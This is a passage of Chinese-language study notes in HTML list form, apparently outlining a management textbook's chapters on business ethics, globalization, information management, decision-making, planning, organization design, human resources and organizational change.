<li>影晌管理道德的因素<ul>
<li>道德发展阶段  <img src = "2018_10_31_05.bmp"></li>
<li>个人特性</li>
<li>组织结构<ul>
<li>组织内部机构和职责分工有没有必要的权力制衡、监察、检查、审计机制，有没有外部群众和舆论监督</li>
<li>组织内部有无明确的规章制度</li>
<li>上级管理行为的示范作用</li>
<li>绩效评估考核体系会起到指挥棒的作用</li>
</ul>
</li>
<li>组织文化</li>
<li>问题强度</li>
</ul>
</li>
</ul>
</li>
<li>改善企业道德行为的途径<ul>
<li>挑选高道德素质的员工</li>
<li>建立道德守则和决策规则</li>
<li>管理者在道德方面领导员工<ul>
<li>高层管理人员在言行方面是员工的表率</li>
<li>高层管理人员可以通过奖惩机制来影响员工的道德行为</li>
<li>高层管理者要勇千承担责任</li>
</ul>
</li>
<li>设定工作目标</li>
<li>对员工进行道德教育</li>
<li>对绩效进行全面评价</li>
<li>进行独立的社会审计</li>
<li>提供正式的保护机制</li>
</ul>
</li>
<li>企业的社会责任<ul>
<li>企业与现代社会<ul>
<li>企业是现代社会的产物</li>
<li>企业从社会得到的权利与依法克尽的义务之间并不平衡</li>
</ul>
</li>
<li>企业的价值观<ul>
<li>价值观是关于价值的一定信念、倾向、主张和态度的系统观点</li>
<li>企业价值观主要表现在全体成员对本企业”应当是什么”和“应当做什么“的高度认同  <img src = "2018_10_31_06.bmp"></li>
</ul>
</li>
<li>企业社会责任的体现<ul>
<li>办好企业，把企业做强、做大、做久</li>
<li>企业一切经营管理行为应符合道德规范</li>
<li>社区福利投资</li>
<li>社会慈善事业</li>
<li>自觉保护自然环境</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="三、全球化与管理"><a href="#三、全球化与管理" class="headerlink" title="三、全球化与管理"></a>三、全球化与管理</h3><ul>
<li>全球化内涵<ul>
<li>世界层面上的全球化内涵<ul>
<li>在世界层面上，全球化是指国家之间日益增长的经济相互依赖性，反映在商品、服务、资本和信息等方面不断增长的跨国流通上</li>
</ul>
</li>
<li>国家或地区层面上的全球化内涵<ul>
<li>在国家或地区层面上，全球化是指一个国家或地区的经济与世界其他领域之间的联系程度</li>
</ul>
</li>
<li>产业层面上的全球化内涵<ul>
<li>在产业层面上，全球化是指某一产业在全球范围内的扩张和活动，以及在全球国家或地区间相互依赖的程度</li>
</ul>
</li>
<li>企业层面上的全球化内涵<ul>
<li>在公司层面上，全球化是指公司在各国或地区的收人分而和资产扩展困的程度，以及与各国或地区的资本、商品和信息的跨国／地区交流程度</li>
</ul>
</li>
</ul>
</li>
<li>全球化与管理者<ul>
<li>全球化管理的环境因素<ul>
<li>全球化的一般环境<ul>
<li>政治与法律环境<ul>
<li>国家政治体制</li>
<li>政治的稳定性</li>
<li>政府对外来经营者的态度</li>
<li>法律环境</li>
</ul>
</li>
<li>经济和技术环境<ul>
<li>经济体制和经济政策</li>
<li>经济发展水平及其发展潜力</li>
<li>市场规模及其准入程度</li>
<li>科技发展水平</li>
<li>社会基础设施</li>
</ul>
</li>
<li>文化环境<ul>
<li>权力距离</li>
<li>不确定性的避免</li>
<li>个人主义或集体主义</li>
<li>男性化或女性化</li>
<li>长期导向或短期导向</li>
</ul>
</li>
</ul>
</li>
<li>全球化的任务环境<ul>
<li>供应商<ul>
<li>全球化进程使得全球化采购和全球化外包得以进行。</li>
</ul>
</li>
<li>销售商<ul>
<li>全球化给企业带来更为丰富的销售商选择机会</li>
</ul>
</li>
<li>顾客</li>
<li>竞争对手<ul>
<li>不论是跨国经营还是当地经营，全球化环境导致来自国内外日益加剧的竞争挑战</li>
</ul>
</li>
<li>劳动力市场及工会<ul>
<li>全球化不仅促进了劳动力在不同国家或地区间的流动，而且加快了劳动力市场的一体化和规范化</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>全球化管理者的关键能力<ul>
<li>国际商务知识</li>
<li>文化适应能力</li>
<li>视角转换能力</li>
<li>创新能力</li>
</ul>
</li>
</ul>
</li>
<li>全球化与管理职能<ul>
<li>全球化经营的进入方式决策<ul>
<li>出口<ul>
<li>间接出口</li>
<li>直接出口</li>
</ul>
</li>
<li>非股权安排<ul>
<li>特许</li>
<li>合同制造</li>
<li>管理合同</li>
</ul>
</li>
<li>国际直接投资<ul>
<li>合资进入</li>
<li>独资进人</li>
<li>新建进入</li>
<li>购并进人</li>
</ul>
</li>
</ul>
</li>
<li>全球化经营的组织模式<ul>
<li>全球化的压力</li>
<li>当地化的压力</li>
<li>全球化组织模式的选择<ul>
<li>多国组织模式</li>
<li>国际组织模式</li>
<li>全球组织模式</li>
<li>跨国组织模式</li>
</ul>
</li>
</ul>
</li>
<li>全球化经营的领导风格  <img src = "2018_10_31_07.bmp">
  <img src = "2018_10_31_08.bmp"></li>
<li>全球化经营的管理控制<ul>
<li>管理控制系统的制定逻辑</li>
<li>管理控制系统的设计</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="四、信息与信息化管理"><a href="#四、信息与信息化管理" class="headerlink" title="四、信息与信息化管理"></a>四、信息与信息化管理</h3><ul>
<li>信息及其特征<ul>
<li>信息的定义<ul>
<li>在管理学科中，通常认为“数据经过加工处理就成了信息。”  <img src = "2018_10_31_09.bmp"></li>
</ul>
</li>
<li>对信息的评估</li>
<li>有用信息的特征  <img src = "2018_10_31_10.bmp"></li>
</ul>
</li>
<li>信息管理工作<ul>
<li>信息的采集<ul>
<li>明确采集的目的</li>
<li>界定采集的范围</li>
<li>选择信息源</li>
</ul>
</li>
<li>信息的加工<ul>
<li>鉴别<ul>
<li>查证法</li>
<li>比较法</li>
<li>佐证法</li>
<li>逻辑法</li>
</ul>
</li>
<li>筛选<ul>
<li>真实性筛选</li>
<li>适用性筛选</li>
<li>精约性筛选</li>
<li>先进性筛选</li>
</ul>
</li>
<li>排序</li>
<li>初步激活</li>
<li>编写</li>
</ul>
</li>
<li>信息的存储<ul>
<li>信息的存储工作由归档、登录、编目、编码、排架等环节构成<ul>
<li>准确性问题</li>
<li>安全性问题</li>
<li>费用问题</li>
<li>方便性问题</li>
</ul>
</li>
</ul>
</li>
<li>信息的传播<ul>
<li>目的更加具体</li>
<li>控制更加严密</li>
<li>时效更加显著</li>
<li>导致信息畸变的原因<ul>
<li>传播主体的干扰</li>
<li>传播渠道的干扰</li>
<li>传播的客观障碍的存在</li>
</ul>
</li>
</ul>
</li>
<li>信息的利用<ul>
<li>信息的利用过程通常包括以下步骤<ul>
<li>管理者在认清问题性质的前提下，判断什么样的信息有助千问题的解决。</li>
<li>对组织目前拥有的信息资源进行梳理，在此基础上，判断所需的信息是否存在“</li>
<li>如果组织中存在所需的信息，则可直接利用。如果不存在，则要考虑是否能够通过对现有信息进行开发、整合来满足管理者对信息的需要。如果不能，则要考虑重新采集信息，回到信息管理的源头。</li>
</ul>
</li>
<li>更好地利用信息<ul>
<li>善于开发信息</li>
<li>为信息价值的充分发挥提供组织上的保证</li>
<li>用发展的眼光看待信息的价值</li>
</ul>
</li>
<li>尽力避免以下现象<ul>
<li>信息孤岛</li>
<li>信息过载</li>
</ul>
</li>
</ul>
</li>
<li>信息的反馈<ul>
<li>反馈信息真实、准确</li>
<li>信息传递迅速、及时</li>
<li>控制措施适当、有效</li>
</ul>
</li>
</ul>
</li>
<li>信息化管理<ul>
<li>信息系统的要素  <img src = "2018_10_31_11.bmp"></li>
<li>企业信息化管理的发展<ul>
<li>20世纪60年代开环的物料需求计划</li>
<li>20世纪70年代闭环的物料需求计划  <img src = "2018_10_31_12.bmp">
  <img src = "2018_10_31_13.bmp"></li>
<li>20世纪80年代制造资源计划  <img src = "2018_10_31_14.bmp"></li>
<li>20世纪90年代企业资源计划<ul>
<li>最初Gartner Group 公司是通过一系列的功能来对ERP 进行界定的：<ul>
<li>超越MRP II 范围的集成功能-包括质量管理、试验室管理、流程作业管理、配方管理、产品数据管理、维护管理、管理报告和仓库管理</li>
<li>支持混合方式的制造环境~括既可支持离散又可支持流程的制造环境，以及按照面向对象的业务模型组合业务过程的能力和在国际范图内的应用。</li>
<li>支持能动的监控能力，提高业务绩效~括在整个企业内采用控制和工程方法、模拟功能、决策支持和用于生产及分析的图形能力</li>
<li>支持开放的客户机／服务器计算环境一—包括客户机／服务器体系结构、图形用户界面、计算机辅助设计工程、面向对象设计技术、使用结构化查询语言 、对关系数据库查询以及内部集成的工程系统、商业系统、数据采集和外部集成</li>
</ul>
</li>
<li>从管理思想、软件产品、管理系统三个层次理解ERP<ul>
<li>第一，ERP 是一整套企业管理系统体系标准，其实质是在MRPII 基础上进一步发展而成的面向供应链(Supply Chain ) 的管理思想；</li>
<li>第二，ERP 综合应用了客户机／服务器体系、关系数据库结构、面向对象技术、图形用户界面、第四代语言(4GL) 、网络通信等信息产业成果，是以管理企业整体资源的管理思想为灵魂的软件产品</li>
<li>第三，ERP 是集整合企业管理理念、业务流程、基础数据、人力物力、计算机硬件和软件于一体的企业资源管理系统</li>
</ul>
</li>
<li>一般的管理主要包括三方面的内容<ul>
<li>财务管理模块<ul>
<li>会计核算</li>
<li>财务管理</li>
</ul>
</li>
<li>生产控制管理模块<ul>
<li>主生产计划</li>
<li>物料需求计划</li>
<li>能力需求计划</li>
<li>车间控制</li>
<li>制造标准</li>
</ul>
</li>
<li>物流管理<ul>
<li>分销管理</li>
<li>库存控制</li>
<li>采购管理</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="综合案例"><a href="#综合案例" class="headerlink" title="综合案例"></a>综合案例</h3><ul>
<li>中国乳业上演生死时速</li>
<li>法国总部来了个中国人</li>
</ul>
<h2 id="第二篇、决策与计划"><a href="#第二篇、决策与计划" class="headerlink" title="第二篇、决策与计划"></a>第二篇、决策与计划</h2><h3 id="五、决策与决策方法"><a href="#五、决策与决策方法" class="headerlink" title="五、决策与决策方法"></a>五、决策与决策方法</h3><ul>
<li>决策与决策理论<ul>
<li>决策的定义<ul>
<li>在本书中，我们采用路易斯、古德曼和范特(Lewis , Goodman and Fandt,1998) 对决策的定义：“管理者识别并解决问题的过程，或者管理者利用机会的过程。”</li>
<li>对于这一定义，可作如下理解<ul>
<li>决策的主体是管理者，因为决策是管理的一项职能</li>
<li>决策的本质是一个过程，这一过程由多个步骤组成，尽管各人对决策过程的理解不尽相同</li>
<li>决策的目的是解决问题或利用机会，这就是说，决策不仅仅是为了解决问题，有时也是为了利用机会</li>
</ul>
</li>
</ul>
</li>
<li>决策的原则<ul>
<li>决策遵循的是满意原则，而不是最优原则</li>
<li>使决策达到最优，必须具备以下条件<ul>
<li>容易获得与决策有关的全部信息</li>
<li>真实了解全部信息的价值所在，并据此拟定出所有可能的方案</li>
<li>准确预测每个方案在未来的执行结果</li>
</ul>
</li>
<li>现实中，上述这些条件往往得不到满足<ul>
<li>组织内外的很多因素都会对组织的运行产生不同程度的影响，但决策者很难收集到反映这些因素的一切信息</li>
<li>对于收集到的有限信息，决策者的利用能力也是有限的，从而决策者只能拟定数量有限的方案</li>
<li>任何方案都要在未来实施，而未来是不确定的</li>
</ul>
</li>
</ul>
</li>
<li>决策的依据<ul>
<li>管理者在决策时离不开信息。信息的数量和质董直接影响决策水平</li>
</ul>
</li>
<li>决策理论<ul>
<li>古典决策理论<ul>
<li>古典决策理论是基于“经济人“假设提出的，主要盛行于20世纪50年代以前</li>
<li>古典决策理论的主要内容有以下几个方面<ul>
<li>决策者必须全面掌握有关决策环境的信息情报</li>
<li>决策者要充分了解有关备选方案的情况；</li>
<li>决策者应建立—个合理的层级结构，以确保命令的有效执行；</li>
<li>决策者进行决策的目的始终在于使本组织获取最大的经济利益</li>
</ul>
</li>
</ul>
</li>
<li>行为决策理论<ul>
<li>行为决策理论的发展始于20世纪50年代</li>
<li>行为决策理论的主要内容有以下几个方面<ul>
<li>人的理性介于完全理性和非理性之间，即人是有限理性的，这是因为在高度不确定和极其复杂的现实决策环境中，人的知识、想象力和计算力是有限的</li>
<li>决策者在识别和发现问题中容易受知觉上的偏差的影响，而在对未来的状况做出判断时，直觉的运用往往多于逻辑分析方法的运用</li>
<li>由于受决策时间和可利用资源的限制，决策者即使充分了解和掌握有关决策环境的信息情报，也只能做到尽量了解各种备选方案的情况，而不可能做到全部了解，决策者选择的理性是相对的</li>
<li>在风险型决策中，与对经济利益的考虑相比，决策者对待风险的态度对决策起着更为重要的作用</li>
<li>决策者在决策中往往只求满意的结果，而不愿费力寻求最佳方案</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>决策过程<ul>
<li>诊断问题（识别机会）</li>
<li>明确目标</li>
<li>拟定方案</li>
<li>筛选方案</li>
<li>执行方案</li>
<li>评估效果</li>
</ul>
</li>
<li>决策的影响因素  <img src = "2018_10_31_15.bmp"></li>
<li>决策方法<ul>
<li>定性决策方法<ul>
<li>以下几点是定性决策方法仍有用武之地的理由<ul>
<li>人们面对信息不完全的决策问题时，比如面对新的环境里出现的新问题，难以使用对数据依赖程度很高的定量方法</li>
<li>当决策间题与人们的主观意愿关系密切时，企如定箭分析的目标函数如何确定，特别是当多个决策者意见有分歧时，需要采用定性方法或以定性为主的决策方法。</li>
<li>当决策问题十分复杂，现有的定量分析方法和计算工具难以胜任时，人们也不得不进行粗略的估计和采用定性分析方法</li>
</ul>
</li>
<li>集体决策方法<ul>
<li>头脑风暴法<ul>
<li>各自发表自己的意见，对别人的建议不作评论</li>
<li>建议不必深思熟虑，越多越好</li>
<li>鼓励独立思考、奇思妙想；</li>
<li>可以补充完善已有的建议。</li>
</ul>
</li>
<li>名义小组技术</li>
<li>德尔菲技术<ul>
<li>根据问题的特点，选择和邀请做过相关研究或有相关经验的专家</li>
<li>将与问题有关的信息分别提供给专家，请他们各自独立发表自己的意见，并写成书面材料。</li>
<li>管理者收集并综合专家们的意见后，将综合意见反馈给各位专家，请他们再次发表意见如果分歧很大，可以开会集中讨论；否则，管理者分头与专家联络</li>
<li>如此反复多次，最后形成代表专家组意见的方案</li>
</ul>
</li>
</ul>
</li>
<li>有关活动方向的决策方法<ul>
<li>经营单位组合分析法  <img src = "2018_10_31_16.bmp"></li>
<li>政策指导矩阵  <img src = "2018_10_31_17.bmp"></li>
</ul>
</li>
</ul>
</li>
<li>定量决策方法<ul>
<li>确定型决策方法<ul>
<li>分析与建模</li>
<li>模型求解</li>
</ul>
</li>
<li>不确定型决策方法<ul>
<li>小中取大法</li>
<li>大中取大法</li>
<li>最小最大后悔值法</li>
</ul>
</li>
<li>风险型决策方法<ul>
<li>最大期望收益准则</li>
<li>最大期望效用准则</li>
<li>面对小概率事件需要注意的问题</li>
<li>多阶段决策问题与决策树</li>
</ul>
</li>
</ul>
</li>
<li>计算机模拟决策方法<ul>
<li>输人基本参数</li>
<li>模拟第一次投资</li>
<li>模拟多次投资</li>
<li>利用“模拟运算表”进行分析</li>
</ul>
</li>
<li>决策模拟演练<ul>
<li>企业竞争模拟及软件简介</li>
<li>企业竞争模拟的组织与特点</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="六、计划与计划工作"><a href="#六、计划与计划工作" class="headerlink" title="六、计划与计划工作"></a>六、计划与计划工作</h3><ul>
<li>计划的概念及其性质<ul>
<li>计划的概念<ul>
<li>What —做什么？目标与内容</li>
<li>Why 一为什么做？原因</li>
<li>Who -一谁去做？人员</li>
<li>Where—何地做？地点</li>
<li>When-何时做？时间</li>
<li>How -怎样做？方式、手段</li>
</ul>
</li>
<li>计划与决策<ul>
<li>决策与计划是两个既相互区别、又相互联系的概念</li>
</ul>
</li>
<li>计划的性质<ul>
<li>计划工作为实现组织目标服务</li>
<li>计划工作是管理活动的桥梁，是组织、领导和控制等管理活动的基础</li>
<li>计划工作具有普遍性和秩序性</li>
<li>计划工作要追求效率</li>
</ul>
</li>
</ul>
</li>
<li>计划的类型  <img src = "2018_10_31_18.bmp">
  <img src = "2018_10_31_19.bmp">
  <img src = "2018_10_31_20.bmp"></li>
<li>计划编制过程  <img src = "2018_10_31_21.bmp"></li>
</ul>
<h3 id="七、战略性计划与计划实施"><a href="#七、战略性计划与计划实施" class="headerlink" title="七、战略性计划与计划实施"></a>七、战略性计划与计划实施</h3><ul>
<li>战略环境分析<ul>
<li>外部一般环境<ul>
<li>政治环境包括一个国家的社会制度，执政党的性质，政府的方针、政策、法令等</li>
<li>社会文化环境包括一个国家或地区居民的教育程度和文化水平、宗教信仰、风俗习惯、审美观点、价值观念等</li>
<li>经济环境主要包括宏观和微观两个方面的内容。宏观经济环境主要指一个国家的人口数量及其增长趋势，国民收入、国民生产总值及其变化情况以及通过这些指标能够反映的国民经济发展水平和发展速度。微观经济环境主要指企业所在地区或所服务地区的消费者的收人水平、消费偏好、储蓄情况、就业程度等因素。</li>
<li>技术环境除了要考察与企业所处领域的活动直接相关的技术手段的发展变化外，还应及时了解： ＠国家对科技开发投资和支持的重点组）该领域技术发展动态和研究开发费用总额；＠技术转移和技术商品化速度；＠专利及其保护情况，等等</li>
<li>自然环境主要指企业经营所处的地理位置、气候条件和资源禀赋状况等自然因素。</li>
</ul>
</li>
<li>行业环境  <img src = "2018_10_31_22.bmp"></li>
<li>竞争对手</li>
<li>企业自身  <img src = "2018_10_31_23.bmp"></li>
<li>顾客（目标市场）  <img src = "2018_10_31_24.bmp"></li>
</ul>
</li>
<li>战略性计划选择  <img src = "2018_10_31_25.bmp">
  <img src = "2018_10_31_26.bmp">
  <img src = "2018_10_31_27.bmp"></li>
<li>计划的组织实施<ul>
<li>目标管理<ul>
<li>目标管理基本思想<ul>
<li>企业的任务必须转化为目标，企业管理人员必须通过这些目标对下级进行领导，并以此来保证企业总目标的实现</li>
<li>目标管理是一种程序，使一个组织中的上下各级管理人员统一起来制定共同的目标，确定彼此的责任，并将此项责任作为指导业务和衡量各自贡献的准则</li>
<li>每个企业管理人员或工人的分目标就是企业总目标对他的要求，同时也是这个企业管理人员或工人对企业总目标的贡献</li>
<li>管理人员和工人是依据设定的目标进行自我管理，他们以所要达到的目标为依据，进行自我指挥自我控制，而不是由他的_f级来指挥和控制</li>
<li>企业管理人员对下级进行考核和奖惩也是依据这些分目标</li>
</ul>
</li>
<li>目标的性质<ul>
<li>目标的层次性</li>
<li>目标网络</li>
<li>目标的可考核性</li>
<li>目标的可接受性</li>
<li>目标的挑战性</li>
<li>伴随信息反馈性</li>
</ul>
</li>
<li>目标管理的过程<ul>
<li>制定目标</li>
<li>明确组织的作用</li>
<li>执行目标</li>
<li>评价成果</li>
<li>实行奖惩</li>
<li>制定新目标并开始新的目标管理循环</li>
</ul>
</li>
</ul>
</li>
<li>滚动计划法<ul>
<li>滚动计划法的基本思想</li>
<li>滚动计划法的评价</li>
</ul>
</li>
<li>网络计划技术<ul>
<li>网络计划技术的基本步骤  <img src = "2018_10_31_28.bmp"></li>
<li>网络图</li>
<li>网络计划技术的评价<ul>
<li>该技术能清晰地表明整个工程的各个项目的时间顺序和相互关系，并指出了完成任务的关键环节和路线</li>
<li>可对工程的时间进度与资源利用实施优化</li>
<li>可事先评价达到目标的可能性</li>
<li>便千组织与控制</li>
<li>易于操作，并具有广泛的应用范围，适用于各行各业以及各种任务</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="综合案例-1"><a href="#综合案例-1" class="headerlink" title="综合案例"></a>综合案例</h3><ul>
<li>准确决策与盲目投资</li>
<li>战略决策是成功之母</li>
</ul>
<h2 id="第三篇、组织"><a href="#第三篇、组织" class="headerlink" title="第三篇、组织"></a>第三篇、组织</h2><h3 id="八、组织设计"><a href="#八、组织设计" class="headerlink" title="八、组织设计"></a>八、组织设计</h3><ul>
<li>组织与组织设计<ul>
<li>组织设计的必要性分析</li>
<li>组织设计的任务和原则<ul>
<li>组织设计的任务  <img src = "2018_10_31_29.bmp">
  * 为了达到组织设计的理想效果，组织设计者需要完成以下几项工作
      * 职能与职务的分析与设计
      * 部门设计
      * 层级设计</li>
<li>组织设计的原则<ul>
<li>专业化分工的原则</li>
<li>统一指挥原则</li>
<li>控制幅度原则</li>
<li>权责对等原则</li>
<li>柔性经济原则</li>
</ul>
</li>
</ul>
</li>
<li>组织设计的影晌因素<ul>
<li>环境的影响<ul>
<li>环境包括一般环境和特定环境两部分</li>
<li>组织设计者可以通过以下几种方法提高组织对环境的应变性<ul>
<li>对传统的职位和职能部门进行相应的调整</li>
<li>根据外部环境的不确定程度设计不同类型的组织结构</li>
<li>根据组织的差别性、整合性程度设计不同的组织结构</li>
<li>通过加强计划和对环境的预测减少不确定性</li>
<li>通过组织间合作尽量减小组织自身要素资源对环境的过度依赖性</li>
</ul>
</li>
</ul>
</li>
<li>战略的影响<ul>
<li>战略发展有四个不同阶段<ul>
<li>数量扩大阶段</li>
<li>地区开拓阶段</li>
<li>纵向联合发展阶段</li>
<li>产品多样化阶段</li>
</ul>
</li>
<li>四种战略类型<ul>
<li>防御者型</li>
<li>探险者型</li>
<li>分析者型</li>
<li>反应者型</li>
</ul>
</li>
</ul>
</li>
<li>技术的影晌</li>
<li>组织规模与生命周期的影响<ul>
<li>大型组织与小型组织在组织结构上的区别主要体现在以下几个方面。<ul>
<li>规范化程度</li>
<li>集权化程度</li>
<li>复杂化程度</li>
<li>人员结构比率</li>
</ul>
</li>
<li>组织生命周期各个阶段的特点有以下几个方面<ul>
<li>创业阶段</li>
<li>集合阶段</li>
<li>规范化阶段</li>
<li>精细阶段</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>组织的部门化<ul>
<li>组织部门化的基本原则<ul>
<li>因事设职和因人设职相结合的原则</li>
<li>分工与协作相结合的原则</li>
<li>精简高效的部门设计原则</li>
</ul>
</li>
<li>组织部门化的基本形式<ul>
<li>职能部门化  <img src = "2018_10_31_30.bmp"></li>
<li>产品或服务部门化  <img src = "2018_10_31_31.bmp"></li>
<li>地域部门化  <img src = "2018_10_31_32.bmp"></li>
<li>顾客部门化  <img src = "2018_10_31_33.bmp"></li>
<li>流程部门化  <img src = "2018_10_31_34.bmp"></li>
<li>矩阵型结构  <img src = "2018_10_31_35.bmp"></li>
<li>动态网络型结构  <img src = "2018_10_31_36.bmp"></li>
</ul>
</li>
</ul>
</li>
<li>组织的层级化<ul>
<li>组织的层级化与管理幅度<ul>
<li>管理幅度与组织层级的互动性  <img src = "2018_10_31_37.bmp"></li>
<li>管理幅度设计的影响因素<ul>
<li>工作能力</li>
<li>工作内容和性质<ul>
<li>主管所处的管理层次</li>
<li>下属工作的相似性</li>
<li>计划的完善程度</li>
<li>非管理事务的多少</li>
</ul>
</li>
<li>工作条件<ul>
<li>助手的配备情况</li>
<li>信息手段的配备情况</li>
<li>工作地点的相近性</li>
</ul>
</li>
<li>工作环境</li>
</ul>
</li>
</ul>
</li>
<li>层级设计需要解决的主要问题：集权与分权<ul>
<li>权力的性质与特征<ul>
<li>职权在被接受之前必须具备四个条件<ul>
<li>在做决定时，下属必须能够了解沟通的内容；</li>
<li>在做决定时，下属必须深信他的要求和组织的宗旨是一致的；</li>
<li>在做决定时，下属必须深信他的要求跟他本人的兴趣是一致的；</li>
<li>在做决定时，下属在体力和精力上应能予以配合，职权的行使不能逾越他们的能力和服从范围</li>
</ul>
</li>
<li>职权分为三种形式<ul>
<li>直线职权</li>
<li>参谋职权</li>
<li>职能职权</li>
</ul>
</li>
<li>管理中的职权来源于以下三个方面<ul>
<li>在层级组织中居于某一特殊职位所拥有的命令指挥权；</li>
<li>由于个人具备某些核心专长或高级技术知识而拥有的技术能力职权；</li>
<li>由千个人能够有效地激励、领导和影响他人而拥有的管理能力职权。</li>
</ul>
</li>
</ul>
</li>
<li>组织层级化设计中的集权与分权<ul>
<li>组织分权程度的四条标准。<ul>
<li>较低的管理层次作出的决策数量越多，分权程度就越大。</li>
<li>较低的管理层次作出的决策重要性越大，分权程度就越大。</li>
<li>较低的管理层次作出的决策影响面越大，分权程度就越大。</li>
<li>较低的管理层次所作的决策审核越少，分权程度就越大</li>
</ul>
</li>
<li>影响组织分权程度的主要因素<ul>
<li>组织规模的大小</li>
<li>政策的统一性</li>
<li>员工的数量和基本素质</li>
<li>组织的可控性</li>
<li>组织所处的成长阶段</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>组织层级设计中的授权<ul>
<li>授权的含义及其有效性<ul>
<li>授权的含义有<ul>
<li>分派任务</li>
<li>授予权力或职权</li>
<li>明确责任</li>
</ul>
</li>
<li>有效授权的要素<ul>
<li>信息共享</li>
<li>提高授权对象的知识与技能</li>
<li>充分放权</li>
<li>奖励绩效</li>
</ul>
</li>
<li>授权的原则<ul>
<li>重要性原则</li>
<li>适度原则</li>
<li>权责一致原则</li>
<li>级差授权原则</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="九、人力资源管理"><a href="#九、人力资源管理" class="headerlink" title="九、人力资源管理"></a>九、人力资源管理</h3><ul>
<li>人力资源计划<ul>
<li>人力资源计划的任务<ul>
<li>系统评价组织中人力资源的需求量</li>
<li>选配合适的人员</li>
<li>制定和实施人员培训计划</li>
</ul>
</li>
<li>人力资源计划的过程  <img src = "2018_10_31_38.bmp">
  * 评估现有的人力资源状况
  * 评估未来人力资源状况
  * 制定一套相适应的人力资源计划</li>
<li>人力资源计划编制的原则<ul>
<li>既要保证企业短期自下而上的需要，也要能促进企业的长期发展</li>
<li>既要能促进员工现有人力资源价值的实现，又要能为员工的长期发展提供机会</li>
</ul>
</li>
</ul>
</li>
<li>员工的招聘与解聘<ul>
<li>员工招聘的标准<ul>
<li>管理的愿望<ul>
<li>强烈的管理愿望是有效开展工作的基本前提</li>
</ul>
</li>
<li>良好的品德<ul>
<li>良好的品德是每个组织成员都应具备的基本素质</li>
</ul>
</li>
<li>勇千创新的精神</li>
<li>较高的决策能力</li>
</ul>
</li>
<li>员工招聘的来源与方法<ul>
<li>员工招聘的来源<ul>
<li>组织可以通过以下几种渠道来获取必要的人力资源<ul>
<li>广告应聘者</li>
<li>员工或关联人员推荐</li>
<li>职业介绍机构推荐</li>
<li>其他来源</li>
</ul>
</li>
<li>外部招聘<ul>
<li>优势：<ul>
<li>具备难得的“外部竞争优势”</li>
<li>有利千平息并缓和内部竞争者之间的紧张关系</li>
<li>能够为组织输送新鲜血液</li>
</ul>
</li>
<li>局限性<ul>
<li>外聘者对组织缺乏深入了解</li>
<li>组织对外聘者缺乏深入了解</li>
<li>外聘对内部员工的积极性造成打击</li>
</ul>
</li>
</ul>
</li>
<li>内部提升<ul>
<li>优点<ul>
<li>有利于调动员工的工作积极性</li>
<li>有利于吸引外部人才</li>
<li>有利于保证选聘工作的正确性</li>
<li>有利于被聘者迅速展开工作</li>
</ul>
</li>
<li>弊端<ul>
<li>可能会导致组织内部“近亲繁殖“现象的发生</li>
<li>可能会引起同事之间的矛盾</li>
</ul>
</li>
</ul>
</li>
<li>选择招聘方式时应注意以下几个方面的因素<ul>
<li>所需选聘人才的层次</li>
<li>企业经营环境的特点</li>
<li>企业所处的发展阶段</li>
<li>企业战略以及与之相关的企业文化调整的需要</li>
</ul>
</li>
</ul>
</li>
<li>员工招聘的程序与方法<ul>
<li>制定并落实招聘计划</li>
<li>对应聘者进行初选</li>
<li>对初选合格者进行知识与能力的考核<ul>
<li>智力与知识测试</li>
<li>竞聘演讲与答辩</li>
<li>案例分析与候选人实际能力考核</li>
</ul>
</li>
<li>选定录用员工</li>
<li>评价和反馈招聘效果</li>
</ul>
</li>
</ul>
</li>
<li>员工的解聘  <img src = "2018_10_31_39.bmp"></li>
</ul>
</li>
<li>员工培训<ul>
<li>员工培训的目标<ul>
<li>补充知识</li>
<li>发展能力</li>
<li>转变观念</li>
<li>交流信息</li>
</ul>
</li>
<li>员工培训的方法<ul>
<li>导入培训</li>
<li>在职培训</li>
<li>离职培训</li>
</ul>
</li>
<li>管理人员培训的方法<ul>
<li>工作轮换</li>
<li>设置助理职务</li>
<li>临时职务与彼得原理</li>
</ul>
</li>
</ul>
</li>
<li>绩效评估<ul>
<li>绩效评估的作用<ul>
<li>绩效评估为最佳决策提供了重要的参考依据</li>
<li>绩效评估为组织发展提供了重要的支持</li>
<li>绩效评估为员工提供了一面有益的“镜子”</li>
<li>绩效评估为确定员工的工作报酬提供依据</li>
<li>绩效评估为员工潜能的评价以及相关人事调整提供了依据</li>
</ul>
</li>
<li>绩效评估的程序与方法<ul>
<li>确定特定的绩效评估目标</li>
<li>确定考评贵任者</li>
<li>评价业绩</li>
<li>公布考评结果，交流考评意见</li>
<li>根据考评结论，将绩效评估的结论备案</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="十、组织变革与组织文化"><a href="#十、组织变革与组织文化" class="headerlink" title="十、组织变革与组织文化"></a>十、组织变革与组织文化</h3><ul>
<li>组织变革的一般规律<ul>
<li>组织变革的动因<ul>
<li>组织变革的必要性分析</li>
<li>组织变革的原因<ul>
<li>外部环境因素<ul>
<li>宏观社会经济环境的变化</li>
<li>科技进步的影响</li>
<li>环境资源的影响</li>
<li>竞争观念的改变</li>
</ul>
</li>
<li>内部环境因素<ul>
<li>组织机构适时调整的要求</li>
<li>保障信息畅通的要求</li>
<li>克服组织低效率的要求</li>
<li>快速决策的要求</li>
<li>提高组织整体管理水平的要求</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>组织变革的类型和目标<ul>
<li>组织变革的类型<ul>
<li>战略性变革</li>
<li>结构性变革</li>
<li>流程主导性变革</li>
<li>以人为中心的变革</li>
</ul>
</li>
<li>组织变革的目标<ul>
<li>提高组织的环境适应性</li>
<li>提高管理者的环境适应性</li>
<li>提高员工的环境适应性</li>
</ul>
</li>
</ul>
</li>
<li>组织变革的内容<ul>
<li>人员变革</li>
<li>结构变革</li>
<li>技术与任务变革</li>
</ul>
</li>
</ul>
</li>
<li>管理组织变革<ul>
